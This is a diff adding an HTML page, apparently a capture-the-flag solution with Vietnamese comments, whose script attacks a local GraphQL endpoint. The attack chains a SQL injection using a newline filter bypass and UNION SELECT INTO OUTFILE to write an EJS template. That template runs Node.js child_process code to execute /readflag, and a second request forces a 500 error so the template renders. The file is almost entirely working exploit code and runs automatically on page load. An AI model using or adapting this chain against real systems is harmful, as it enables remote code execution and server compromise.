@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <h1>Pwned Report</h1>
+    <div id="result">Waiting for flag...</div>
+    <script>
+        // Token Admin bạn đã tạo được từ bước trước
+        const token = "YOUR_ADMIN_TOKEN_HERE"; 
+        const graphqlUrl = "http://127.0.0.1:42744/graphql?token=" + token;
+
+        // Payload SQL Injection
+        // 1. \n : Bypass filter regex
+        // 2. ' UNION SELECT : Kết thúc query cũ, bắt đầu query mới
+        // 3. EJS Payload: Mã độc Node.js để chạy /readflag
+        // 4. INTO OUTFILE: Ghi nội dung xuống file template lỗi 500
+        
+        const ejsPayload = `<% 
+            const { execSync } = require("child_process"); 
+            try {
+                const flag = execSync("/readflag").toString(); 
+                %><%= flag %><% 
+            } catch(e) { 
+                %><%= e.message %><% 
+            } 
+        %>`;
+
+        // SQL Injection đầy đủ
+        // Cấu trúc bảng users có 4 cột (id, name, department, isPresent) nên ta select 4 giá trị.
+        // Cột thứ 2 (name) là chuỗi, ta nhét payload vào đây.
+        const sqlPayload = `\n' UNION SELECT 1, '${ejsPayload}', 'dept', 1 INTO OUTFILE '/app/views/errors/500.ejs' -- -`;
+
+        const queryWriteFile = {
+            "query": `query { getDataByName(name: "${sqlPayload}") { name } }`
+        };
+
+        const queryTriggerError = {
+            "query": `query { getDataByName(name: "'") { name } }` // Gửi dấu ' để gây lỗi 500 SQL syntax
+        };
+
+        async function exploit() {
+            try {
+                // Bước 1: Gửi SQLi để ghi file mã độc
+                await fetch(graphqlUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(queryWriteFile)
+                });
+
+                // Chờ 1 chút để file kịp ghi (file I/O)
+                await new Promise(r => setTimeout(r, 1000));
+
+                // Bước 2: Gửi request gây lỗi để server render file 500.ejs
+                // Lúc này server sẽ chạy code trong 500.ejs và trả về Flag
+                const res = await fetch(graphqlUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(queryTriggerError)
+                });
+
+                const text = await res.text();
+                document.getElementById("result").innerText = text;
+                document.body.innerHTML += "<br><pre>" + text + "</pre>";
+
+            } catch (e) {
+                document.getElementById("result").innerText = "Error: " + e;
+            }
+        }
+
+        exploit();
+    </script>
+</body>
+</html>
